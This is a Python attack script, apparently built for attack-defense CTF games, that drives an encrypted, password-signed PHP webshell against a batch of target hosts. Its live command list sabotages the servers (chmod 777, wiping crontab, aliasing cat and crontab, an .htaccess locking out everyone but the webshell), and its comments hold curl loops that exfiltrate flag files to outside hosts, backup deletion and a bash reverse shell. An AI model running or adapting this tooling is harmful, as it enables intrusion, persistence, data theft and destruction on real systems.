#!/usr/bin/python
# -*- coding: UTF-8 -*-
# made by 3s_NwGeek
import requests,re,random,time,base64,traceback
from gevent import monkey
from gevent.pool import Pool
monkey.patch_all()
from urllib import unquote
from random import random
from hashlib import md5
passwd = 'ts@hack'
cmds='''whoami
chmod 777 -R ./*
alias cat="echo `date`|md5sum|cut -d ' ' -f1||"
crontab -r
alias crontab="echo no crontab for `whoami` ||"
echo 'T3JkZXIgZGVueSxhbGxvdwpEZW55IGZyb20gYWxsCjxGaWxlcyAiLkNvbmZfY2hlY2sucGhwIj4KICAgIEFsbG93IGZyb20gYWxsCjwvRmlsZXM+'|base64 -d >./.htaccess
'''
# cmd='shutdown -s -t 100'
#删除备份文件
#cmd='find . -name '*.bak' -type f -print -exec rm -rf {} \;'
#cmd='find . -name '*.zip' -type f -print -exec rm -rf {} \;'
#cmd='find . -name '*.tar' -type f -print -exec rm -rf {} \;'
# cmd='curl http://x2zrbg.ceye.io/submit_flag/ -d "flag=$(cat /var/www/html/flag.txt)&token=666"'
#有执行权限写.sh
# cmd = '''echo 'while true;do curl http://218ji1.ceye.io/submit_flag/ -d "flag=$(cat /var/www/html/flag.txt)&token=666";sleep 10;done;'>1.sh '''
# cmd = 'chmod 777 1.sh'
# cmd = './1.sh'
# cmd = 'rm /var/www/uploadfile'
#没执行权限执行命令
# cmd = 'while true;do curl http://218ji1.ceye.io/submit_flag/ -d "flag=$(cat /var/www/html/flag.txt)&token=666";sleep 150;done;'
# cmd = 'while true;do echo "<team>中通服</team>";sleep 0.01;done;'
#反弹shell
# cmd ='bash -i >& /dev/tcp/192.168.75.1/7777 0>&1'
# cmd="cat /var/www/Hill/SCORE_POINTS"
webshell_url = 'http://TARGET_IP/public/js/.Conf_check.php'
'http://10.66.20.15/api/v1/ad/web/submit_flag/?event_id=7'
targets = open("C:\Users\\3s_NwGeek\Desktop\\target.txt").read().splitlines()  #批量目标
# local_upload_file= open('C:\Users\\3s_NwGeek\Desktop\\1123.php', "rb")#要上传本地文件路径
# upload_filename="123.php"#上传文件名名称
# var_name="file"#上传参数名称
#上传提交地址


#登陆成功特征值
#更改成功特征值
#请求参数

def main(target):
    targetURL=webshell_url.replace('TARGET_IP',target)
    for cmd in cmds.splitlines():
        res=excmd(targetURL, passwd, cmd)
        print target,'-----',cmd,'----->',res


def getSerTime(url):
    ser_time_format = '%a, %d %b %Y %H:%M:%S GMT'
    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'}
    r = requests.get(url, allow_redirects=False,headers=head)
    if r.headers['Date']:
        stimestrp = time.strptime(r.headers['Date'], ser_time_format)
        stime = time.mktime(stimestrp) + 60 * 60 * 8    # GMT + 8 时区
        timeskew = int(time.time()) - int(stime)
        return timeskew
    else:
        return None
# 加密
def encrypt(string, salt, encoding='utf-8'):
    estring = ''
    b64string = base64.b64encode(string.encode(encoding)).decode('utf-8')
    for n, char in enumerate(b64string):
        estring += chr(ord(char) ^ n % salt)
    return estring
# 解密
def decrypt(estring, salt, encoding='utf-8'):
    data=estring[::-1].replace('cAFAcABAAswTA2GE2c','i').replace(':kcehc_revres','=').encode('unicode_escape').decode("string_escape")
    string=unquote(base64.urlsafe_b64decode(data))
    # string=unicode(string, "gb2312").encode("utf8")#有中文乱码去掉这个注释
    return string
# 命令执行
def excmd(url, passwd, cmd, encoding='utf-8'):
    try:
        timeskew = getSerTime('/'.join(url.split('/')[:-1]))
        # 校对服务器时间，防止时间差造成API校验失败
        nowtime = int(time.time())
        if timeskew == None:
            print('检查服务器时间出错，请手动确认服务器时间！')
            # 手动获取服务器时间戳，并保存到servtime变量中，int类型
            # Linux下获取方法： date +%s
            # Windows的话，还是运行Python, time.time()吧，放弃治疗
            servtime = 1540891350
            nowtime = servtime
        else:
            nowtime -= timeskew
        # 开始发起请求
        passwd = md5(passwd.encode('utf-8')).hexdigest()
        salt = int(random() * 100)
        ecmd = encrypt(cmd, salt)
        sign_tmp = ecmd + passwd + str(nowtime) + str(salt)
        sign = md5(sign_tmp.encode('utf-8')).hexdigest()
        parameters = {
            'time': nowtime,
            'check': ecmd,
            'salt': salt,
            'sign': sign
        }
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'}
        r = requests.get(url, params=parameters, headers=head,proxies={'http': 'http://127.0.0.1:8080'},timeout=5)
        # r = requests.get(url, params=parameters, headers=head,timeout=5)
        # r = requests.post(url, data=parameters, headers=head, proxies={'http': 'http://127.0.0.1:8080'}),
        res = decrypt(r.content.decode('utf-8'), salt, encoding)
        return res
    except Exception as e:
        pass
        # print('参数配置错误，连接异常err:%s'%str(e))
        return '连接超时或执行出错'
        # traceback.print_exc()


if __name__ == '__main__':
    # main()
    pool = Pool(len(targets))  #批量
    pool.map(main, targets)